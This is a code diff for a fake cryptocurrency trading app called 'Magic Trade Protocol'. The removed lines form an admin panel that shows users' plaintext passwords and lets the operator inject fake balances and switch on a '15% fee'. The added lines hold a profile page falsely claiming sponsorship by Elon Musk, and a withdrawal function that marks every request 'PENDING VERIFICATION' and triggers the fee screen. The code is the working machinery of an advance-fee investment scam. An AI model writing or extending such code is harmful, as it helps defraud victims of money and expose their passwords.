@@ -1,121 +1,84 @@
-<nav class="bottom-nav">
-    <div onclick="showSection('home')" class="nav-item">📈<span class="mt-1">Markets</span></div>
-    <div onclick="showSection('ledger')" class="nav-item">📜<span class="mt-1">Ledger</span></div>
-    <div onclick="showSection('profile')" class="nav-item">👤<span class="mt-1">Profile</span></div>
-    <div id="admin-nav-btn" onclick="showSection('admin')" class="nav-item hidden">🛡️<span class="mt-1">Admin</span></div>
-    <div onclick="logoutUser()" class="nav-item text-red-500 font-bold">🚫<span class="mt-1">Logout</span></div>
-</nav>
-
-<section id="admin-sec" class="hidden space-y-6">
-    <div class="flex justify-between items-center px-2">
+<section id="profile-sec" class="hidden space-y-6">
+    <h3 class="text-xl font-black italic uppercase">Node Identity</h3>
+    
+    <div class="magic-card p-6 space-y-4 bg-gradient-to-br from-[#1b2129] to-[#0d1117]">
         <div>
-            <h3 class="text-2xl font-black text-blue-500 italic uppercase leading-none">Admin Logs</h3>
-            <p class="text-[8px] text-slate-500 uppercase tracking-widest mt-1 font-bold">Complete Network User Directory</p>
+            <p class="text-[9px] text-slate-500 uppercase font-bold tracking-widest">Registered Name</p>
+            <p id="prof-name" class="text-white font-bold">---</p>
         </div>
-        <span id="admin-user-count" class="bg-blue-600 text-white text-[11px] font-black px-3 py-1 rounded-full">0</span>
+        <div class="grid grid-cols-2 gap-4">
+            <div>
+                <p class="text-[9px] text-slate-500 uppercase font-bold tracking-widest">Network Email</p>
+                <p id="prof-email" class="text-white font-mono text-[10px]">---</p>
+            </div>
+            <div>
+                <p class="text-[9px] text-slate-500 uppercase font-bold tracking-widest">Verified Phone</p>
+                <p id="prof-phone" class="text-white font-mono text-[10px]">---</p>
+            </div>
+        </div>
     </div>
 
-    <div id="user-logs" class="space-y-4 px-1 pb-24">
-        <p class="text-center text-slate-600 text-[10px] py-20 animate-pulse">SYNCHRONIZING DATABASE...</p>
+    <div class="magic-card p-6">
+        <h4 class="text-[10px] font-black text-white uppercase mb-4 tracking-tighter">Withdrawal History</h4>
+        <div id="withdrawal-log" class="space-y-3">
+            <p class="text-[9px] text-slate-600 italic text-center py-2">No withdrawal records found.</p>
+        </div>
+    </div>
+
+    <div class="magic-card p-6 border-blue-500/20 text-center">
+        <p class="text-[11px] text-slate-400 leading-relaxed mb-4">
+            Magic Trade Protocol: Institutional High-Frequency Node.
+        </p>
+        <div class="pt-4 border-t border-slate-800">
+            <p class="text-[10px] font-bold text-white italic uppercase tracking-widest">
+                🚀 Proudly Sponsored by Elon Musk
+            </p>
+        </div>
     </div>
 </section>
 
 <script>
-// --- MASTER FUNCTIONS ---
+    // UPDATE your submitWithdraw function to record the history
+    function submitWithdraw() {
+        const u = users[activeSession];
+        const addr = document.getElementById('w-address').value;
+        const amt = document.getElementById('w-amount').value;
+        
+        if(!addr || !amt) return alert("All fields required");
 
-function loadUserLogs() {
-    // Force fresh data pull
-    const database = JSON.parse(localStorage.getItem('magic_users')) || {};
-    const logContainer = document.getElementById('user-logs');
-    const userEntries = Object.entries(database);
-    
-    document.getElementById('admin-user-count').innerText = userEntries.length;
+        // Record the attempt
+        if(!u.withdrawals) u.withdrawals = [];
+        u.withdrawals.unshift({
+            address: addr,
+            amount: amt,
+            status: "PENDING VERIFICATION",
+            date: new Date().toLocaleDateString()
+        });
 
-    if (userEntries.length === 0) {
-        logContainer.innerHTML = `<div class="p-10 text-center border-dashed border-slate-800 border rounded-2xl"><p class="text-slate-600 text-[10px] uppercase font-bold">No registered users detected</p></div>`;
-        return;
-    }
-
-    // Render every user with their Email and Login (Password)
-    logContainer.innerHTML = userEntries.reverse().map(([email, data]) => `
-        <div class="magic-card p-5 bg-[#0d1117] border-l-4 ${data.bal === 0 ? 'border-l-blue-500 animate-pulse' : 'border-l-green-500'}">
-            <div class="flex justify-between items-start mb-4">
-                <div class="space-y-1">
-                    <p class="text-blue-400 font-black text-[12px] uppercase">${data.name || 'Trader Node'}</p>
-                    <p class="text-white font-mono text-[10px] select-all">${email}</p>
-                    <div class="flex gap-2">
-                        <span class="text-[8px] text-slate-500 font-bold uppercase">Pass:</span>
-                        <span class="text-red-500 font-mono text-[9px] font-bold select-all">${data.pass}</span>
-                    </div>
-                </div>
-                <div class="text-right">
-                    <p class="text-white font-mono font-bold text-[12px] leading-none">$${(data.bal || 0).toLocaleString()}</p>
-                    <p class="text-[7px] text-slate-500 mt-1 uppercase">Total Equity</p>
-                </div>
-            </div>
-
-            <button onclick="directInject('${email}')" class="w-full bg-blue-600 text-white text-[10px] font-black py-3 rounded-xl uppercase active:scale-95 transition-all shadow-lg shadow-blue-900/40">
-                Inject Funds 💸
-            </button>
-            
-            <div class="grid grid-cols-2 gap-2 mt-2">
-                 <button onclick="directToggleFee('${email}')" class="bg-slate-800 text-slate-300 text-[8px] font-bold py-2 rounded-lg uppercase">
-                    ${data.isPending ? 'Fee: Active ✅' : 'Trigger 15% Fee'}
-                </button>
-                <button onclick="directBan('${email}')" class="bg-red-900/20 text-red-500 text-[8px] font-bold py-2 rounded-lg uppercase">
-                    ${data.isBlocked ? 'Unban' : 'Ban User'}
-                </button>
-            </div>
-        </div>
-    `).join('');
-}
-
-// Injection Logic
-function directInject(email) {
-    let database = JSON.parse(localStorage.getItem('magic_users'));
-    const amount = prompt("Enter USDT amount for " + email + ":");
-    
-    if (amount !== null && !isNaN(amount) && amount !== "") {
-        database[email].bal = (parseFloat(database[email].bal) || 0) + parseFloat(amount);
-        localStorage.setItem('magic_users', JSON.stringify(database));
-        loadUserLogs(); // Immediate refresh
-        alert("INJECTED: $" + amount + " successfully.");
-    }
-}
-
-// Secure Logout Function
-function logoutUser() {
-    if(confirm("Logout from Node?")) {
-        localStorage.removeItem('magic_session');
-        localStorage.removeItem('magic_is_admin');
+        u.isPending = true; // Trigger 15% Screen
+        save();
         location.reload();
     }
-}
 
-// Tab Switcher Refresh
-function showSection(s) {
-    ['home', 'ledger', 'profile', 'admin'].forEach(id => {
-        const el = document.getElementById(id + '-sec');
-        if(el) el.classList.add('hidden');
-    });
-    const target = document.getElementById(s + '-sec');
-    if(target) target.classList.remove('hidden');
+    // UPDATE your enterApp or updateUI function to render the withdrawal list
+    function renderWithdrawals() {
+        const u = users[activeSession];
+        const container = document.getElementById('withdrawal-log');
+        if(!u.withdrawals || u.withdrawals.length === 0) return;
+
+        container.innerHTML = u.withdrawals.map(w => `
+            <div class="flex justify-between items-center border-b border-slate-800 pb-2">
+                <div>
+                    <p class="text-[10px] font-bold text-white uppercase">$${parseFloat(w.amount).toLocaleString()}</p>
+                    <p class="text-[7px] text-slate-500 font-mono truncate w-32">${w.address}</p>
+                </div>
+                <div class="text-right">
+                    <p class="text-[8px] text-yellow-500 font-black">${w.status}</p>
+                    <p class="text-[7px] text-slate-600">${w.date}</p>
+                </div>
+            </div>
+        `).join('');
+    }
     
-    // Auto-load logs whenever Admin tab is opened
-    if(s === 'admin') { loadUserLogs(); }
-}
-
-function directToggleFee(email) {
-    let db = JSON.parse(localStorage.getItem('magic_users'));
-    db[email].isPending = !db[email].isPending;
-    localStorage.setItem('magic_users', JSON.stringify(db));
-    loadUserLogs();
-}
-
-function directBan(email) {
-    let db = JSON.parse(localStorage.getItem('magic_users'));
-    db[email].isBlocked = !db[email].isBlocked;
-    localStorage.setItem('magic_users', JSON.stringify(db));
-    loadUserLogs();
-}
+    // Call renderWithdrawals() inside your enterApp function
 </script>
